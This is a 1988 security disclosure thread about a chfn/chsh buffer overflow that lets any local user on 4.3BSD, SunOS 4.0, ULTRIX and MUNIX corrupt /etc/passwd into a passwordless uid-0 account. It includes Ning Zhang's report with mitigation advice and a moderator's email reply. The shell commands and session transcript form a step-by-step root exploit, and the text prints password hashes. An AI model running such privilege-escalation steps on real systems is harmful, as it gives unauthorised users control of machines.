To: hotline@sun.com, 4bsd-bugs@ucbvax.berkeley.edu
Subject: chfn as a replacement for su.
Date: Fri, 16 Dec 88 15:06:03 EST
From: Felix Lee <flee>

Under sunos4.0.

% (repeat 1020 echo -n '.'; echo '') > dog
		# create a file with a single line of 1020 dots.
% chfn < dog
% chfn < dog	# do it again.
% chfn < dog	# and again.

There is now a line that looks something like this
	.......::0:0::
in the password file (the number of dots may vary).

The long line in the password file also breaks many other things.
vi doesn't like it (vipw loses).  awk doesn't like it (yp make loses).
The getpw*() routines don't like it (finger loses).

Under 4.3bsd.

Trying a similar trick overwrites the stack when chfn tries to update
the dbm files (in replace()).  I don't know what happens if you don't
overflow this buffer; dbm seems to get confused (it complains that
there's no space left on device).

Fix.

I suppose getpw*() should act more gracefully, but that's not quite
enough.  Many programs seem quite surprised when the gcos exceeds their
expectations.  The simplest solution is to impose an arbitrarily small
limit on the gcos field.  10 characters should be plenty.

As a temporary measure, the passwd/chsh/chfn program should be disabled.
- --
Felix Lee	flee@shire.cs.psu.edu	*!psuvax1!shire!flee

==========================================================================
To: 4bsd-bugs@ucbvax.berkeley.edu
Subject: Update to chfn as a replacement for su.
Date: Sat, 17 Dec 88 22:20:36 EST
From: Felix Lee <flee>

See previous message, "chfn as a replacement for su".

Under 4.3bsd, a similar trick does work, but you have to be a little more
precise.

Give chfn the right arguments so that your line in the passwd file ends
up exactly 1024 characters long (there is a slight tolerance; about a
dozen characters more will work).  (If you give it more than that,
chfn will segmentation fault, leaving an /etc/ptmp lying around.)

chfn will (probably) report that the dbm_store failed, for some reason
I haven't traced down yet (probably overwriting the stack in replace()).

Then you chfn again.  After chfn rewrites the password file, there will
be a line that looks like this (the login name may vary)
	csh::0:0::

- --
Felix Lee	flee@shire.cs.psu.edu	*!psuvax1!shire!flee

==========================================================================
Subject: chfn/chsh/passwd security problem
Index: bin/passwd 4.3BSD-tahoe

Description:

            Chfn: A Dangerous Security Hole of 4.3BSD UNIX*
            ==============================================

                            Ning Zhang+

                   ZGDV (Computer Graphics Center)
                         Wilhelminenstr. 7
                   D-6100 Darmstadt, West Germany
                     e-mail:  zhang@zgdvda.uucp
                      Phone:  +49/6151/1000-67



                             ABSTRACT

           On the morning of 17 December 1988,  I found a very
           dangerous hole of 4.3BSD UNIX.  This hole exists in
           all 4.3BSD UNIX systems in  Zentrum fuer Graphische
           Datenverarbeitung e.V.  (Computer Graphics Center),
           Darmstadt,  West Germany.  These systems are VAXen,
           MicroVAXen, and VAXstations, all running ULTRIX-32,
           SUN-3s and SUN-4s running SunOS 4.0, and PCS Cadmus
           9200s running MUNIX based on  AT&T System V.2  with
           some  4.3BSD  extensions.  It makes that everybody,
           provide he or she  has a account to  access any one
           system,  s/he can very easily  become a super-user.
           This report gives a detail description and analysis
           of the hole  generated by a 4.3BSD UNIX  privileged
           utility called chfn(1). It should be point out that
           the author  of chfn(1)  is a very  experienced UNIX
           programmer or expert, at least in my mind. His name
           is Mark R. Horton, one of the implementators of 4.2
           /3BSD UNIX, one author of news v2.11, etc.  Now, he
           is the moderator of  the most important news group:
           news.announce.important! (Sorry, Mark, It's True!)

           This is the first draft version of the report. Any
           comments and suggestions are welcome.



          Copyright (C) 1988 by Ning Zhang, All rights reserved.

Permission is hereby granted to make copies of this work,  without charge,
for the purpose of UNIX security.  Any such copies must include a copy of
this title page and copyright notice. Any other reproduction, publication,
or use is strickly prohibited without express written premission.

------------------------------------------------------------------------
+(permanent address: Institute of AI, Zhejiang Univ. Hangzhou, PR China)
------------------------------------------------------------------------







Dec 20 20:28 1988  Copyright (C) 1988 by Ning Zhang. All rights reserved. Page 2







            Chfn: A Dangerous Security Hole of 4.3BSD UNIX*
            ==============================================


                            Ning Zhang+

                   ZGDV (Computer Graphics Center)
                         Wilhelminenstr. 7
                   D-6100 Darmstadt, West Germany
                     e-mail:  zhang@zgdvda.uucp
                      Phone:  +49/6151/1000-67




Chfn(1) (CHANGE FINGER ENTRY) is really a small entry of a finger to break down
any 4.3BSD UNIX system [Copyright (C) 1988 by Ning Zhang. ALL RIGHTS RESERVED.].


------------------------------------------------------------------------
+(permanent address: Institute of AI, Zhejiang Univ. Hangzhou, PR China)
------------------------------------------------------------------------
*UNIX is a registered trademark of AT&T Laboratories.
 BSD is an acronym for Berkeley Software Distribution.
 PCS, Cadmus and MUNIX are trademark of Periphere Computer Systeme, GmbH.
 SUN, Sun Workstations and SunOS are trademarks of Sun Microsystems, Inc.
 VAX, MicroVAX, VAXstation, ULTRIX-32  and  Worksystem are trademarks of 
 Digital Equipment Corporation.
------------------------------------------------------------------------






On the morning of 17 December 1988, I got a copy of the Internet worm report
[1]. As Matthias Muth (one of system managers in our site) said, reading Gene
Spafford's report is really fascinating. But when I reached section 3.11 of
that report, it reminded me that there maybe also some security bugs in other
privileged programs, rather than finger(1). These programs are su(1), chsh(1),
chfn(1), etc. I simply tried the command chfn(1) and chsh(1) on VAX-11/750
running ULTRIX-32 V2.0 (which is 4.3BSD based). Very bad, I could add a new
privileged account which has no password, no home directory and no login
shell, its uid and gid are both 0. After tried to login with that new
privileged account but failed, I used the su(1) command and successed to
become a super-user! The procedure is like the following (Here for clarity,
I omit some characters inside of '[]', leave a space line between the output
of last command and the next command line, and use the statement "enter as
many letter 1's as possible" to represent that I entered many letter 1's
until the input buffer of stdin was full and then deleted one letter 1 and
hitted <return> key.). Note I use C-Shell on ULTRIX-32.







Dec 20 20:28 1988  Copyright (C) 1988 by Ning Zhang. All rights reserved. Page 3



-------------------------------------------------------------------------------

zhang 1 % mkdir /tmp/tmp; chmod 700 /tmp/tmp; cp /etc/passwd /tmp/tmp/passwd

zhang 2 % grep zhang /etc/passwd
zhang:O6eHHisvGACJs:1694:400:Ning Zhang, ZGDV (Computer Graphics Center), Wilhel
minenstr. 7, D-6100 Darmstadt, West Germany. Phone +49/6151/1000-67:/lukas/usr1/
extern/zhang:/usr/new/csh

zhang 3 % chfn zhang
Default values are printed inside of of '[]'.
To accept the default, type <return>.
To have a blank entry, type the word 'none'. 

Name [Ning Zhang]: <enter as many letter 1's as possible>
Office or Mail Stop (no colons) [...]: <enter as many letter 1's as possible>
Office Phone (Ex: 1234 or 123-4567) [...]: <enter as many letter 1's as possible>
Home Phone (Ex: 123-4567) or 123-456-7890] [...]: <enter as many letter 1's as 
possible>

zhang 4 % grep zhang /etc/passwd
zhang:O6eHHisvGACJs:1694:400:111111111111111111111111111111111111111111111111111
                        (all 1's and three ,'s)
11111111111111111111111111111111111111111111111111111111111111111111111111111111
11111111:/lukas/usr1/extern/zhang:/usr/new/csh

zhang 5 % !! | wc -l
grep zhang /etc/passwd | wc -l
       1

zhang 6 % chsh csh

zhang 7 % grep 1111 /etc/passwd
zhang:O6eHHisvGACJs:1694:400:111111111111111111111111111111111111111111111111111
                        (all 1's and three ,'s)
1111111111111111111111111111111::0:0:::
1111111111111111111111:/lukas/usr1/extern/zhang:0:0:::

zhang 8 % !! | wc -l
grep 1111 /etc/passwd | wc -l
       2

zhang 9 % chfn zhang
Default values are printed inside of of '[]'.
To accept the default, type <return>.
To have a blank entry, type the word 'none'. 

Name [1...1]: <return>
Office or Mail Stop (no colons) [1...1]: <return>
Office Phone (Ex: 1234 or 123-4567) [1...1]: <return>
Home Phone (Ex: 123-4567) or 123-456-7890] [1...1]: <enter as many letter 1's as
 possible>

zhang 10 % grep 1111 /etc/passwd
zhang:O6eHHisvGACJs:1694:400:111111111111111111111111111111111111111111111111111







Dec 20 20:28 1988  Copyright (C) 1988 by Ning Zhang. All rights reserved. Page 4


                        (all 1's and three ,'s)
1111111111111111111111111111111::0:0:::
:0:0:::
1111111111111111111111:/lukas/usr1/extern/zhang:0:0:::

zhang 11 % !! | wc -l
grep 1111 /etc/passwd | wc -l
       3

zhang 12 % chsh csh

zhang 13 % grep 1111 /etc/passwd
zhang:O6eHHisvGACJs:1694:400:111111111111111111111111111111111111111111111111111
                        (all 1's and three ,'s)
1111111111111111111111111111111::0:0:::
:0:0:::
1111111111111111111111:/lukas/usr1/extern/zhang:0:0:::

zhang 14 % !! | wc -l
grep 1111 /etc/passwd | wc -l
       4

zhang 15 % /bin/login 111111111111111111
login failed
login:

zhang 16 % su 111111111111111111

# cd /tmp

# echo > zhang

# /bin/ls -lg zhang
-rw-rw-r--  1 root     system          0 Dec 17 11:30 zhang

# cp /tmp/tmp/passwd /etc/passwd

# exit

zhang 17 % tail -3 /usr/adm/sulog
SU: mueller /dev/ttyp4 Thu Dec 15 11:58:47 1988
SU: muth /dev/ttyp0 Fri Dec 16 01:10:32 1988
SU: zhang /dev/ttyp1 Sat Dec 17 11:29:57 1988

zhang 18 % grep zhang /etc/passwd
zhang:O6eHHisvGACJs:1694:400:Ning Zhang, ZGDV (Computer Graphics Center), Wilhel
minenstr. 7, D-6100 Darmstadt, West Germany. Phone +49/6151/1000-67:/lukas/usr1/
extern/zhang:/usr/new/csh

zhang 19 % exit

zhang 20 % logout

-------------------------------------------------------------------------------

At first I make a copy of /etc/passwd for safety. Then I run chfn(1) to change my







Dec 20 20:28 1988  Copyright (C) 1988 by Ning Zhang. All rights reserved. Page 5


finger entry field and tried to insert as many characters as possible. The 7th
command showed the result. Then I run chsh(1) to change my login shell. Because
this buggy command only has a buffer of 1024 bytes, my password entry was broken
into two lines, and a string :0:0::: was append to the ends of the two lines.
At the same time, a new account which uid and gid are both 0, and has no home
directory and login shell, was created, but its password field was just my home
directory. My password entry had an empty home directory field. I tried the
above step two times and a new super-user account was finally created without
password, home directory and login shell. The following things I think every
UNIX system manager can understand. I just run su(1) to become a super-user
using that new super-user account, and then made sure that I was really a
super-user. At last, I restored the old /etc/passwd file and logout from the
privileged account.

It should be point out that the above procedure also can be done by a shell
script, and in fact, chfn(1) is enough, chsh(1) is used only for convenience
(I was lazy to enter many characters).

Here, I think it is necessary to talk a little about the 4.3BSD utility chfn(1).
Chfn(1) means to change user's finger entry. It works very like passwd(1), but
only change the GCOS field of user's password entry in /etc/passwd. In passwd(5)
file each user has the following information:

        name (login name, contains no upper case, no more than 8 chars)
        encrypted password
        numerical user ID
        numerical group ID
        user's real name, office, phone, etc. (historically called GCOS field)
        initial working directory (i.e. home directory)
        program to use as Shell (i.e. login shell)

The above 7 fields are separated by 6 ':' characters. For example, one password
entry may like this:

zhang:rTAnoMC48IV1U:1694:400:Ning Zhang, TEL 6151-1000-67:/extern/zhang:/usr/csh

The GCOS field may be empty. If the home directory field is empty, the system
lets it be "/", and if login shell is null, then /bin/sh is used when the user
login. The user ID of a super-user should be 0, but its group ID can be any
valid group ID. The encrypted password field is the last guard to prevent
someone to be a super-user. For some detail information, reference the reports
of Dennis Ritchie [2] and Robert Morris and Ken Thompson [3]. It is too
dangerous if there is a super-user account without password. To most of non-
privileged users, chfn(1) is not well-known, even to most of super-users and
system managers in our site, because the GCOS field is less concerned with
system security. In fact, chfn(1) is used only by some experienced UNIX users,
who want to tell more information about themselves, to some utilities, such as
mail(1), finger(1), fingerd(8), etc. automatically. A user's GCOS field is
less active than the password field. So after it was filled, it generally
don't changed for a long time. That's the reason I think why the bug inside
of chsh(1) has not been found until now, since 4.2BSD UNIX became public in
July 1983. I found there are two version of chfn(1) in our site. The old one is
in command line mode to change user's entry, and the new one interactive mode.

After found the above password trick, I tried it on MicroVAX II (ULTRIX-32
V2.0), VAXstation 2000, VAXstation II, VAXstation II/GPX, (ULTRIX-32 V2.0,







Dec 20 20:28 1988  Copyright (C) 1988 by Ning Zhang. All rights reserved. Page 6


Worksystem 1.1), VAXstation 3500 (ULTRIX-32 V2.3, Worksystem 1.1), it always
works! I also tried it successfully and more easily on PCS Cadmus 9200 (which
is running MUNIX V.2/03 based on AT&T UNIX System V.2 with some 4.3BSD
extensions, but there is no chsh(1) utility available and the version of
chfn(1) on PCS Cadmus MUNIX is different from that on ULTRIX-32. On Cadmus,
Chfn(1) got user's full name from command line, i.e. the full name is a command-
line argument to chfn(1). Because of the limitation of stdin buffer for a tty is
only 256 bytes, I just tried the trick by running a very simple shell script
like this:

/usr/ucb/chsh zhang 1111111....512.1's......11111111
/usr/ucb/chsh zhang 1111111....512.1's......11111111
/usr/ucb/chsh zhang 1111111....512.1's......11111111

to create a new super-user account without password successfully.

On SUN-3s and SUN-4s running SunOS Release 4.0, to tried that trick becomes
easier than that on ULTRIX and MUNIX. The version of chsh(1) on SunOS 4.0
interactively to get only one line from stdin as the GCOS field, but limited
the length of the field must be less than 1022. Also because of the stdin buffer
limitation as that of PCS Cadmus MUNIX, I just craeted a file for input (stdin)
redirection by running the shell command:

echo -n > newstdin; repeat 1022 echo -n '1' >> newstdin; echo "" >> newstdin

Then run command:

                         chsh < newstdin

for three times. At this time a new super-user account without password was
also created. It should be point out that chfn(1) on SunOS 4.0 limited the
length of the GCOS filed when it was get from user, but it does not fix the
bug, because the user's password entry was certainly more than 1024 characters
if there are 1022 characters in GCOS filed. This over-long password entry will
be broken into two lines after running command

                        chfn < newstdin

again. Contrary to your and also my original expectation, this trick also works
on SUN-3/60s and SUN-4/150 (SunOS Release 4.0). Originally I think this bug
should have been fixed on SUN, systems because in my mind the experts in charge
of operation system in SUN Microsystems, Inc. could (and should) be very careful.
I got a message before that SUN's software has attacked the Internet in May this
year. Also, I knew that Bill Joy, one of vice president and co-found of SUN, has
the name of "the father of 4BSD UNIX". I could not believe they also left such
big security hole in their proud SunOS Release 4.0. It is really incredible!
Fortunely, this bad trick does not work on SUN Workstations running Sun UNIX 4.2
Release 3.x, i.e. SunOS Release 3.x, because the chfn(1) utility is not included
in those releases (at least 3.5, on SUN-3/60). It also seems that SunOS 4.0 is
more 4.3BSD-based than 3.x. 

It showed that all 4.3BSD-based UNIX systems or some UNIX V-based with some
4.3BSD extensions have the security hole in our institutes, i.e. GRIS
(Interactive Graphics System) of Technical University of Darmstadt, ZGDV
(Computer Graphics Center) and FhG-AGD (Fraunhofer Advanced Graphics Institute).
In our stie, all operation systems concerned with the hole are "official"







Dec 20 20:28 1988  Copyright (C) 1988 by Ning Zhang. All rights reserved. Page 7


releases of the companies. We don't add or modify those systems neither in
kernels or in utilities. Maybe all 4.3BSD-based UNIX systems have this bug!
I think.

Have you seen that the security hole of UNIX is very very serious, haven't you?
Everybody can become a super-user, provide who has a account to access that
4.3BSD-based UNIX system! After found this hole, I wounder whether somebody else
has also found it and keeps it in his or her mind. I knew that there are many
many 4.3BSD sites in the world. If somebody wants to destroy these sites, using 
this trick is much easy. If the author(s) who wrote the worm program that
infected the Internet earlier last month in the United States had known this
thick, I could not image that disaster would become how much serious.

Now, let's talk a little bit about how to prevent this password trick or plug
this security hole on UNIX. Basically, the key this trick was successful is the
chfn(1) utility which is a privileged command. The real reason, I think, is that
the standard C library has a few routines that read input without checking for
bounds on the buffer involved, just as that Gene Spafford pointed out in his
report. It gives an evidence of that although experienced UNIX or C programmers
are awere of the problems of some standard C functions, they continue to use
those buggy functions. On ULTRIX, the buffer size used by chfn(1) is just 1024
bytes. If the size of the finger entry fed to chfn(1) is larger than 1024 bytes,
the disaster will occur after using chfn(1) or chsh(1) (its buffer size is 1024
bytes, too) command again. On PCS Cadmus 9200, the buffer is 512 bytes only.
The size of the buffer on SunOS 4.0 is the same as that on ULTRIX. To prevent
this password trick, on ULTRIX or PCS Cadmus MUNIX, just simply erase the
chsh(1) command or do some similar things. But on SunOS Release 4.0, there is
a little bit of difficulty. Three privileged commands, passwd(1), chsh(1) and
chsh(1) are actually linked to one file. To plug the security hole, the file
should be patched with adb(1) to not let the function of changing user's finger
entry be effective.

I don't know how many 4.3BSD-based UNIX systems have the hole? If you found it
in your system, could you tell me the machine type, operation system and your
comments? Thanks in advance.

Yesterday I read a news from the newsnet that SUN will ship its SunOS Release
4.0.1 with a lot of bugs fixed. It is said that a login bug was fixed also.
I don't know this bug is that I found. About VAX, I also heard ULTRIX-32 V3.0
is now beta testing. I also don't know if the security hole has been plugged.
Hope all have been fixed!

Finally, let's get the conclusion. Every 4.3BSD-based UNIX system should be
fixed if the hole exists. To program each privileged command, don't use the
standard C library functions, especially for I/O. Every privileged program
should be well tested, especially for each extreme situation. Each system
manager should be very careful with the privileged commands and some
important directories!

                                        .End. 1988.Dec.17.
-------------------------------------------------------------------------------
P.S. I have been a part-time system manager for 5 years in China.
P.S. But now I am working on  Computer Graphics  (It's my major).
===============================================================================

I just found another very interesting thing connected with this security hole.







Dec 20 20:28 1988  Copyright (C) 1988 by Ning Zhang. All rights reserved. Page 8


After I have tried the trick on PCSs, SUNs and VAXen, I thought I should
report this dangerous hole. But I didn't know where I should send a message
to. On evening, when I have told this thick to Jaromir Likavec, another 
system manager in our site, he suggested me to post a short news to
newsgroup news.announce.important. Because in China there is no any
public network available, even uucp, I am not familiar with news posting.
After I have tried several times with utility postnews(1), I successed and
postnews(1) told me that news.announce.important is moderated. So I should
wait the moderator's reply before I can see my article in that newsgroup.
After 24 hours past, this evening, the reply arrived. Unfortunately, the
moderator rejected me. But he also sent this reply with my contribution to
Dennis O'Brien, who does UNIX security for AT&T. So Vassilios Sakas (who is
in charge of APOLLO Domain systems in our site) suggested me post a short
message to Dnet, and send a short description to Berkeley again. After done
this job, I checked the different version manuals of PCS Cadmus MUNIX. And
I am very curious that I am very familiar with the author's name of chfn(1),
Mark Horton. A while later, I recalled that Mark Horton is the name of the
moderator of newsgroup news.announce.important, because I read his reply
just half an hour ago. Have checked all documents of PCS Cadmus UNIX and
ULTRIX-32, I make sure that, Mark R. Horton, the moderator of newsgroup
news.announce.important, was the author of chfn(1), the maker of the big
security hole of 4.3BSD UNIX, when he was in the University of California
at Berkeley! (He also was the author or one of the authors of some other
UNIX utilities, such as news v2.11, checknr(1), vfontinfo(1), ul(1), w(1), 
etc.) Although he made this hole some years ago, he is really a very
experienced UNIX programmer or expert, at least in my mind. In my
contribution sent to him, I requested the net folks send the answer to the
newsgroup, rather than send it to me directly, because e-mail is expensive
to us, both sending and receiving. Mark suggested that I should be careful
to use news, because it may cost too many Marks. But I think there is only
one Mark in the world, whose last name is Horton :-) (I don't intend to attack
Mark Horton, maybe I misunderstand him, because a Chinese is very different
from a Westerner in the ways of thinking and writing. No harm. Just for making
a serious thing be more like a joke) The following is his ways of reply to me:

===============================================================================
From unido!uunet!cis.ohio-state.edu!osu-cis!stargate!mark Sun Dec 18 20:53:03 1988
Received: from uunet by unido.uucp via EUnet with uucp for zgdvda 
          id AQ25906; Sun, 18 Dec 88 16:57:34 +0100
Received: from TUT.CIS.OHIO-STATE.EDU by uunet.UU.NET (5.59/1.14) 
        id AA02238; Sun, 18 Dec 88 10:29:22 EST
Received: by tut.cis.ohio-state.edu (5.59/2.881128)
        id AA16669; Sun, 18 Dec 88 10:29:18 EST
Received: by osu-cis.cis.ohio-state.edu (smail2.5)
        id AA28563; 18 Dec 88 10:28:54 EST (Sun)
Received: by stargate.COM (smail2.5)
        id AA00575; 18 Dec 88 10:58:58 EDT (Sun)
To: unido!zgdvda!zhang
Subject: Re:  *VERY* Dangerous Hole of UNIX !!!
Cc: dob@whutt.att.com
Message-Id: <8812181058.AA00575@stargate.COM>
Date: 18 Dec 88 10:58:58 EDT (Sun)
From: unido!uunet!stargate.com!mark (Mark Horton)
Status: RO

> Path: zgdvda!zhang







Dec 20 20:28 1988  Copyright (C) 1988 by Ning Zhang. All rights reserved. Page 9


> From: uunet.UU.NET!unido!zgdvda!zhang (Ning Zhang)
> Newsgroups: news.admin,news.sysadmin,news.announce.important,general,
>             dnet.general,eunet.general,eunet.followup,eunet.news,comp.misc,
>             comp.risks,comp.unix,comp.unix.wizards
> Subject: *VERY* Dangerous Hole of UNIX !!!
> Keywords: *VERY* Dangerous Hole of UNIX !!!
> Message-Id: <424@zgdvda.UUCP>
> Date: 17 Dec 88 21:21:08 GMT
> Reply-To: uunet.UU.NET!unido!zgdvda!zhang (Ning Zhang)
> Distribution: w
> Organization: ZGDV Darmstadt, FRG
> 
> 
> Hello Everyone in the netland,
> 
> I just found a *VERY* *VERY* *BIG* dangerous hole about UNIX system security.
> Because it is *too* dangerous, I cannot describe it here. But I don't know
> where I should report this hole. If someone knows the place, please post it
> in the above "Newsgroups". (Don't e-mail it to me, because e-mail is too
> expensive for us, both sending and receiving).
> 
>  _______  -^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-
> /____  /  Ning Zhang                           (zhang@zgdvda.uucp)
>  ___/ /   Zentrum fuer Graphische Datenverarbeitung e.V.    (ZGDV)
> /__  /    Wilhelminenstrasse 7, D-6100 Darmstadt, F. R. of Germany
>   / /____ Phone: +49/6151/1000-67             Telex: 4197367 agd d
>  /______/ -v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-v-
> 
> P.S.: I come from P.R. China and now is a guest researcher in ZGDV.
        
        
Since your posting included news.announce.important, which is moderated,
it was mailed to me for posting rather than being posted.  Since your
posting is more a request for information, and since you cross-posted
it to 11 other newsgroups (counter to news.announce.important policy
and standard network practice) I'm not going to post it.  I am instead
referring you to Dennis O'Brien, who does UNIX security for AT&T.

I should note that email is far less expensive than posting to a worldwide
computer network.  If your posting isn't important enough to pay a few
marks for email, it isn't important enough to spend hundreds or even
thousands of marks to send it to 10,000 machines worldwide and cause
250,000 people to read it.  I suspect that Dennis will telephone you,
if the logistics can be worked out (you are in different time zones,
and the Christmas holidays are causing a lot of people to be gone on
vacation until the first of the year), but please be willing to use
email to deal with the issue.

        Mark Horton
        moderator, news.announce.important

-------------------------------------------------------------------------------

In the manual page of chfn(1) on ULTRIX-32 V2.0, it is said that chfn - change
finger entry. But in the manual of PCS Cadmus MUNIX, chfn(1) is a copy from
4BSD, and Mark Horton wrote:







Dec 20 20:28 1988  Copyright (C) 1988 by Ning Zhang. All rights reserved. Page 10



-------------------------------------------------------------------------------

NAME
      chfn - change full name of user
SYNOPSIS
      chfn name strings
DESCRIPTION
      ...........
      An example use of this command would be
            chfn mark '& Horton,508E,7686,5240633'
      Note.......
      ...........
      It is a good idea to run finger(1) on the user before and after chfn to
      make sure you have formatted the data correctly.
SEE ALSO
      finger(1), passwd(5), passwd(1)
AUTHOR
      Mark Horton
BUGS
      The encoding of the office and extension information is installation
      dependent.

-------------------------------------------------------------------------------

All (NEWS, MODERATOR, BUG and MARK) are concerned with one person, Mark Norton.
(Great! or Great?) Do you also think this thing interesting, funny, or crazy ?

I should add a bug report statement in the company of a copyrighted statement
on all chfn(1) manual pages of all UNIX systems:

There is a *very* *big* dangerous UNIX security hole concerned with this chfn
command, I recommend very strongly all UNIX system managers to erase or fix
chfn(1) in their 4.3BSD UNIX-based systems to keep UNIX security. I hope all
UNIX vendors should also fix it!

Chfn(1) (CHANGE FINGER ENTRY) is really a small entry of a finger to break down
any 4.3BSD UNIX system [Copyright (C) 1988 by Ning Zhang. ALL RIGHTS RESERVED.].
So, this small entry is just equal to the big hole of 4.3BSD UNIX security.

                                        .End. 1988.Dec.18.
-------------------------------------------------------------------------------
P.S. I come from P.R. China and now is a guest researcher at ZDGV.
===============================================================================




ACKNOWLEDGEMENTS

I would like to thank Matthias Muth, Vassilios Sakas, Jaromir Likavec and
Dan Kerr of ZGDV for their advice and help. I also would like to thank Dr.
Prof. J.E. Encarnacao and Mr. G. Koeberle for their kind supports.

I apology that there are many English grammer error in this draft report.
Any comments and suggestions are welcome.

REFERENCES

[1] The Internet Worm Program: An Analysis, Purdue Technical Report CSD-TR-823,
    by Eugene H. Spafford,  Department of Computer Sciences, Purdue University, 
    West Lafayette, IN 47907-2044, spaf@cs.purdue.edu

[2] On the Security of UNIX, Dennis M. Ritchie

[3] Password Security: A Case History, Robert Morris and Ken Thompson, Bell
    Laboratories, Murray Hill, New Jersey 07974

